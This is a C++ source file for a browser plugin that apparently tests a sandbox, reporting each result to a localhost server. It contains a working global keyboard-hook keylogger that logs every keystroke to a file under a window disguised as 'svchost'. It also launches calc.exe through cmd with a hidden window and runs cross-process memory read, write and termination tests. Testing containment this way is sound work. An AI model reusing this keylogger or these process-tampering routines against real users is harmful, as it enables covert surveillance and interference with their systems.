/**********************************************************\
  INCLUDES
\**********************************************************/
#include "JSObject.h"
#include "variant_list.h"
#include "DOM/Document.h"
#include "global/config.h"

#include <fstream>
#include <stdio.h>
#include <tchar.h>

//my includes
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <iostream>
#include <windows.h>
#include <string.h>
#include <string>
#include <conio.h>
#include <atlstr.h>
#include <cstdio>
#include <cstdlib>
#include <tlhelp32.h>
// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment(lib, "user32.lib")
#include <thread>
#include <time.h> 

TCHAR szName[]=TEXT("MyFileMappingObject");

//keylogger
HHOOK	kbdhook;	/* Keyboard hook handle */
bool	running;	/* Used in main loop */

char	windir[MAX_PATH + 1];

std::string FilePath;
int seqnum = 1;
int Port;
std::string sID;
HANDLE myPROC;
////////////+
#include "PRCSAPI.h"

/**********************************************************\
  FUNCTIONS/METHODS DEFINITIONS
\**********************************************************/

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::launched(void)
///
/// @brief  - called at startup, deals with initial communication with server
///			- first it gets the port number, test ID and absolute path to files from shared memory
///			- then it is possible to make connection with server
///			- return TRUE if successful, FALSE if not successful
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::launched(void) {
	HANDLE hMapFile;
	LPCTSTR pBuf;
	int BUF_SIZE = 256;
	TCHAR szName[]=TEXT("MyFileMappingObject");

	//read/write access, do not inherit the name, name of mapping object
	hMapFile = OpenFileMapping(FILE_MAP_READ, FALSE, szName);               
	if (hMapFile == NULL) {
		//Could not open file mapping object
		std::string request = std::to_string(seqnum++) + '.' + sID + ":INIT_FAILED";
		COMM comm_now(request);
		comm_now.Communicate();		
		return FALSE;
	}

	pBuf = (LPTSTR) MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, BUF_SIZE);
	if (pBuf == NULL) {
		//Could not map view of file
		std::string request = std::to_string(seqnum++) + '.' + sID + ":INIT_FAILED";
		COMM comm_now(request);
		comm_now.Communicate();
		CloseHandle(hMapFile);
		return FALSE;
	}

	//string from server in shared memory successfully obtained in pBuf variable
	std::string temp = CT2A(pBuf);
	//get port
	std::string sPort = temp.substr(temp.find(':') + 1, temp.find('*')+1);
	Port = stoi(sPort);
	//get test ID
	sID = temp.substr(0, temp.find(':'));
	//get path to server files
	FilePath = temp.substr(temp.find('*') + 1, temp.length());
	
	//unmap & close shared memory
	UnmapViewOfFile(pBuf);
	CloseHandle(hMapFile);

	//success! plugin launched/initialized in browser
	std::string request = std::to_string(seqnum++) + '.' + sID + ":INIT";
	COMM comm_now(request);
	comm_now.Communicate();
	
	
	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::finalize(void)
///
/// @brief  Terminate host process (calc).
///			Send ending message to the server and close the communication.
///			Kill plugin process so the browser can be closed from server.
///			Return TRUE if OK.
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::finalize(void)
{
	//terminate host process if there is any, reset seqnum and send END message
	TerminateProcess(myPROC, 0);

	std::string respon = std::to_string(seqnum++) + '.' + sID + ":END";
	COMM nov(respon);
	nov.Communicate();

	seqnum = 1;

	/*
	//kill plug-in process
	DWORD id = GetCurrentProcessId();
	DWORD dwDesiredAccess = PROCESS_TERMINATE;
	BOOL  bInheritHandle  = FALSE;
	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, id);
	if (hProcess == NULL)
		return FALSE;
	BOOL result = TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	*/
	return TRUE;
}

FB::variant PRCSAPI::RunGeneralTest(std::string executable){
	std::string newhost = FilePath + "bin/" + executable;

	HOST novy(newhost, false);
	// launch host process
	novy.CreateChild();
	int ret = novy.GetExitCode();

	if(ret == 0){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
		return 0;
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}
}

///////////////////////////////////////////////////////////////////////////////
/// @fn FB::variant PRCSAPI::echo(const FB::variant& msg)
///
/// @brief  Echos whatever is passed from Javascript.
///         Go ahead and change it. See what happens!
///////////////////////////////////////////////////////////////////////////////
FB::variant PRCSAPI::CMDproc(void)
{
	wchar_t input[] = L"C:\\Windows\\System32\\calc.exe";
	wchar_t cmd[] = L"cmd";
	// initialize cmd
	wchar_t cmdline[MAX_PATH + 50];
	swprintf_s(cmdline, L"%s /C %s", cmd, input);
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | CREATE_NO_WINDOW;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
	si.wShowWindow = SW_HIDE;
	// If you want to redirect result of command, set startInf.hStdOutput to a file
	// or pipe handle that you can read it, otherwise we are done!
	PROCESS_INFORMATION procInf;
	memset(&procInf, 0, sizeof procInf);
	BOOL b = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
		NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &procInf);
	DWORD dwErr = 0;
	myPROC = procInf.hProcess;
	
	if(b){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
	}

    // return "foobar";
	return TRUE;
}


FB::variant PRCSAPI::startprocess(void){
	HOST novy(FilePath + "bin/" + "createproc", false);
	// launch host process
	novy.CreateChild();
	int ret = novy.GetExitCode();

	if(ret == 1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
	}
		
	return ret;
}

/**
* \brief Called by Windows automagically every time a key is pressed (regardless
* of who has focus)
*/
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp){
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		* Get key name as string
		*/
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, (LPWSTR)tmp, 0xFF);
//		GetKeyNameText()
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		* Non-printable characters only:
		* Some of these (namely; newline, space and tab) will be
		* made into printable characters.
		* Others are encapsulated in brackets ('[' and ']').
		*/
		if (!printable) {
			/*
			* Keynames that change state are handled here.
			*/
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			* Keynames that may become printable characters are
			* handled here.
			*/
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("[" + str + "]");
			}
		}

		/*
		* Printable characters only:
		* If shift is on and capslock is off or shift is off and
		* capslock is on, make the character uppercase.
		* If both are off or both are on, the character is lowercase
		*/
		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}


		std::cout << str;

		std::ofstream myfile;

		myfile.open(FilePath + "log.txt", std::ios_base::app);
		myfile << str;

		myfile.close();

		/*
		std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
		std::ofstream outfile(path.c_str(), std::ios_base::app);
		outfile << str;
		outfile.close();
		*/
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}


/* 
	Generic function to handle messages
*/
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg) {
	case WM_CLOSE: case WM_DESTROY:
		running = false;
		break;

	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}

	return 0;
}



bool PRCSAPI::Keylogger( int num, FB::JSObjectPtr &callback )
{
	std::string respon = std::to_string(seqnum++) + '.' + sID + ":KEYLOG_START";
	COMM nov(respon);
	nov.Communicate();

    boost::thread t(boost::bind(&PRCSAPI::Keylogger_thread,
         this, num, callback));
	// thread started

    return 0; // the thread is started
}

void PRCSAPI::Keylogger_thread( int num, FB::JSObjectPtr &callback )
{
	// Do something that takes a long time here
    int result = num * 10;
	/*
	* Set up window
	*/
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;
	HINSTANCE   thisinstance = GetModuleHandle(NULL);

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = L"winkey";
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	//if (!(RegisterClassEx(&windowclass)))
		//return 1;

	hwnd = CreateWindowEx(NULL, L"winkey", L"svchost", WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	//if (!(hwnd))
		//return 1;

	/*
	* Make the window invisible
	*/

	/*
	* Debug mode: Make the window visiblefddff
	*/
	ShowWindow(hwnd, SW_SHOW);

	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/*
	* Hook keyboard input so we get it too
	*/
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPWSTR)windir, MAX_PATH);

	/*
	* Main loop
	*/
	while (running) {
		/*
		* Get messages, dispatch to window procedure
		*/
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false; /*
							 * This is not a "return" or
							 * "break" so the rest of the loop is
							 * done. This way, we never miss keys
							 * when destroyed but we still exit.
							 */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

    callback->InvokeAsync("", FB::variant_list_of(shared_from_this())(result));
}

//WRITING TO OTHER PROCESS MEMORY
FB::variant PRCSAPI::WriteMemory(void){
	int value = 0;

	// create new instance of class, process - host
	HOST host_proc(FilePath + "bin\\HostWriteProcess.exe", true);
	if(host_proc.State == -1)
		return NULL;
	// start host process
	host_proc.CreateChild();
	if(host_proc.State == -1)
		return NULL;

	std::string ret = host_proc.ReadFromPipe();
	//address
	ret.erase(ret.size() - 1);

	// we have address now, lets launch test write process
	std::string cmd = FilePath + "bin\\TestWriteCase HostWriteProcess.exe ";
	cmd = cmd + ret;

	HOST test_proc(cmd, false);
	
	if (test_proc.State == -1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}
	test_proc.CreateChild();
	if (test_proc.State == -1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}


	value = test_proc.GetExitCode();
	host_proc.WriteToPipe("\n");

	if (value == 0){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
		return 0;
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}




	return TRUE;
}


std::string helpaddress = "";
int helpnum = 0;
int ReadMemoryHostThread(){
	// create new instance of class, process - host
	HOST host_proc(FilePath + "bin\\HostReadProcess.exe", true);
	if (host_proc.State == -1)
		return NULL;
	// start host process
	host_proc.CreateChild();
	if (host_proc.State == -1)
		return NULL;

	helpnum = host_proc.value;
	helpaddress = host_proc.ReadFromPipe();

	Sleep(5000);
	host_proc.WriteToPipe("\n");

	return 0;
}


FB::variant PRCSAPI::ReadMemory(void){
	DWORD value = 0;
	std::string TestOut = "";

	//create cmd line string
	std::string cmd = FilePath + "bin\\TestReadCase HostReadProcess.exe ";
	
	//launch thread with host process
	std::thread t1(ReadMemoryHostThread);
	Sleep(1000);
	//append received address
	helpaddress.erase(helpaddress.size() - 1);
	cmd = cmd + helpaddress;

	//launch test process
	HOST test_proc(cmd, false);
	
	if (test_proc.State == -1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}
	test_proc.CreateChild();
	if (test_proc.State == -1){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}
	
	Sleep(2000);
	// read output from Test Process
	TestOut = test_proc.ReadFromPipe();
	// convert
	int TestInt = atoi(TestOut.c_str());
	// Get return value
	int ReturnValue = test_proc.GetExitCode();

	t1.join();


	if (helpnum == TestInt && ReturnValue == 0){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
		return 0;
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
		return 1;
	}
}

/*
	Launcher of Host process
	Works for:	Terminate Process
				Open Process
				Thread Test??
*/
FB::variant PRCSAPI::terminateProcess(std::string TestExe){
	std::string HostingProcess = "HostTerminateProcess.exe";
	
	// LAUNCH HOST PROCESS
	HOST HostTerminateProcess(FilePath + "bin/" + HostingProcess, false);
	HostTerminateProcess.CreateChild();

	// LAUNCH PROCESS THAT TRIES TO KILL HOST PROCESS
	HOST TestTermination(FilePath + "bin/" + TestExe + " " + FilePath + "bin/" + HostingProcess, false);
	TestTermination.CreateChild();
	// READ EXIT VALUE FOR SUCCESS
	int ret = TestTermination.GetExitCode();

	HostTerminateProcess.WriteToPipe("\n");

	if(ret == 0){
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":SUCCESS";
		COMM nov(respon);
		nov.Communicate();
	}
	else{
		std::string respon = std::to_string(seqnum++) + '.' + sID + ":FAILURE";
		COMM nov(respon);
		nov.Communicate();
	}

	return ret;
}


///////////////////////////////////////////////////////////////////////////////
/// @fn PRCSPtr PRCSAPI::getPlugin()
///
/// @brief  Gets a reference to the plugin that was passed in when the object
///         was created.  If the plugin has already been released then this
///         will throw a FB::script_error that will be translated into a
///         javascript exception in the page.
///////////////////////////////////////////////////////////////////////////////
PRCSPtr PRCSAPI::getPlugin()
{
    PRCSPtr plugin(m_plugin.lock());
    if (!plugin) {
        throw FB::script_error("The plugin is invalid");
    }
    return plugin;
}

// Read/Write property testString
std::string PRCSAPI::get_testString()
{
    return m_testString;
}

void PRCSAPI::set_testString(const std::string& val)
{
    m_testString = val;
}

// Read-only property version
std::string PRCSAPI::get_version()
{
    return FBSTRING_PLUGIN_VERSION;
}

void PRCSAPI::testEvent()
{
    fire_test();
}

/******************* CLASS FOR LAUNCHING HOST PROCESS *******************/

/*
CONSTRUCTOR:
	- create 2 pipes for communication with child
	- child STDIN == parent STDOUT
	- child STDOUT == parent STDIN
	- set State to 0 when success, -1 for failure
*/
HOST::HOST(std::string hostproc, BOOL bValue){	
	//assign exe name
	srand(time(NULL));

	if(bValue){
		value = rand () % 1000;
		hostname = hostproc + " " + std::to_string(value);
	}
	else{
		hostname = hostproc;
	}
	
	//NULL the handles
	hChildStdIN_Rd = NULL;
	hChildStdIN_Wr = NULL;
	hChildStdOUT_Rd = NULL;
	hChildStdOUT_Wr = NULL;
	host_process = NULL;

	// set security attributes
	SECURITY_ATTRIBUTES Sec_Attr;
	Sec_Attr.nLength = sizeof(SECURITY_ATTRIBUTES);
	Sec_Attr.bInheritHandle = TRUE;
	Sec_Attr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT. 
	if (!CreatePipe(&hChildStdOUT_Rd, &hChildStdOUT_Wr, &Sec_Attr, 0))
		State = -1;

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	if (!SetHandleInformation(hChildStdOUT_Rd, HANDLE_FLAG_INHERIT, 0))
		State = -1;

	// Create a pipe for the child process's STDIN.
	if (!CreatePipe(&hChildStdIN_Rd, &hChildStdIN_Wr, &Sec_Attr, 0))
		State = -1;

	// Ensure the write handle to the pipe for STDIN is not inherited.
	if (!SetHandleInformation(hChildStdIN_Wr, HANDLE_FLAG_INHERIT, 0))
		State = -1;

	State = 0;	// OK
}

/*
	DESTRUCTOR
		-close handles

HOST::~HOST(){
	CloseHandle(host_process);
    CloseHandle(host_thread);
}
*/

/*
CREATE CHILD:
	- launch child process
	- set State to 0 when success, -1 for failure
*/
void HOST::CreateChild(){
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = hChildStdOUT_Wr;
	siStartInfo.hStdOutput = hChildStdOUT_Wr;
	siStartInfo.hStdInput = hChildStdIN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 
	TCHAR szProxyAddr[4096];

	_tcscpy_s(szProxyAddr, CA2T(hostname.c_str()));

	bSuccess = CreateProcess(NULL,
		szProxyAddr,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	// If an error occurs, exit the application. 
	if (!bSuccess){
		State = -1;
	}
	else
	{
		// Process successfuly started, save handles for destructor
		host_process = piProcInfo.hProcess;
		host_thread = piProcInfo.hThread;
		State = 0;
	}

	return;
}

/*
	ReadFromPipe()
		-read from child's STDOUT
		-returns string what child sent
*/
std::string HOST::ReadFromPipe(){
	DWORD dwRead;
	CHAR chBuf[4096];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	bSuccess = ReadFile(hChildStdOUT_Rd, chBuf, 4096, &dwRead, NULL);
	if (dwRead == 0)
		return NULL;

	chBuf[dwRead] = 0;
	return std::string(chBuf);
}

/*
	WriteToPipe()
		-write to child's STDOUT
		-return TRUE if successful, FALSE if not
*/
BOOL HOST::WriteToPipe(std::string what){
	DWORD dwWritten;
	BOOL bSuccess = FALSE;

	bSuccess = WriteFile(hChildStdIN_Wr, what.c_str(), what.length(), &dwWritten, NULL);
	if (!bSuccess)
		return FALSE;

	// Close the pipe handle so the child process stops reading. 
	if (!CloseHandle(hChildStdIN_Wr))
		return FALSE;

	return TRUE;
}

/*
	GetExitCode()
		-get the host's return value
*/
int HOST::GetExitCode(){
	DWORD dwMillisec = INFINITE;      
    DWORD dwWaitStatus = WaitForSingleObject( host_process, dwMillisec );
	int nRet = -1;

    if( dwWaitStatus == WAIT_OBJECT_0 ){
        DWORD dwExitCode = NULL;
        GetExitCodeProcess( host_process, &dwExitCode );
        nRet = (int)dwExitCode;
    }

	return nRet;
}


/******************* CLASS FOR COMMUNICATION WITH TCP SERVER *******************/

/*
	CONSTRUCTOR
	- fill the member variables - port no., string to send
*/
COMM::COMM(std::string Buff){
	Buffer = Buff;
	Port_number = Port;
	Received = "";
}

/*
	COMMUNICATE
	- send a request and receive the ACK string
*/
int COMM::Communicate(void){
	// default to localhost
	char *server_name = "localhost";
	char recvBuff[100];
	int retval;
	struct sockaddr_in server;
	struct hostent *hp;
	WSADATA wsaData;
	SOCKET  conn_socket;
	using namespace std;

	if ((retval = WSAStartup(0x202, &wsaData)) != 0)
	{
		fprintf(stderr, "Client: WSAStartup() failed with error %d\n", retval);
		WSACleanup();
		return -1;
	}
	else
		printf("Client: WSAStartup() is OK.\n");

	hp = gethostbyname(server_name);
	if (hp == NULL)
	{
		fprintf(stderr, "Client: Cannot resolve address \"%s\": Error %d\n", server_name, WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: gethostbyaddr() is OK.\n");

	// Copy the resolved information into the sockaddr_in structure
	memset(&server, 0, sizeof(server));
	memcpy(&(server.sin_addr), hp->h_addr, hp->h_length);
	server.sin_family = hp->h_addrtype;
	server.sin_port = htons(Port_number);

	conn_socket = socket(AF_INET, SOCK_STREAM, 0); /* Open a socket */
	if (conn_socket <0)
	{
		fprintf(stderr, "Client: Error Opening socket: Error %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: socket() is OK.\n");

	printf("Client: Client connecting to: %s.\n", hp->h_name);
	if (connect(conn_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: connect() failed: %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: connect() is OK.\n");

	// Try sending some string
	retval = send(conn_socket, Buffer.c_str(), strlen(Buffer.c_str()), 0);
	if (retval == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: send() failed: error %d.\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	else
		printf("Client: send() is OK.\n");
	//MessageBox(NULL, L"Success send", NULL, NULL);
	
	printf("Client: Sent data \"%s\"\n", Buffer.c_str());

	//closesocket(conn_socket);
	//WSACleanup();
		//return -1;
		
	retval = recv(conn_socket, recvBuff, sizeof(recvBuff), 0);
	if (retval == SOCKET_ERROR)
	{
		fprintf(stderr, "Client: recv() failed: error %d.\n", WSAGetLastError());
		closesocket(conn_socket);
		WSACleanup();
		return -1;
	}
	else
		printf("Client: recv() is OK.\n");


	if (retval == 0)
	{
		printf("Client: Server closed connection.\n");
		closesocket(conn_socket);
		WSACleanup();
		return -1;
	}

	Received = std::string(recvBuff);

	printf("Client: Received %d bytes, data \"%s\" from server.\n", retval, recvBuff);

	closesocket(conn_socket);
	WSACleanup();

	return 0;
}
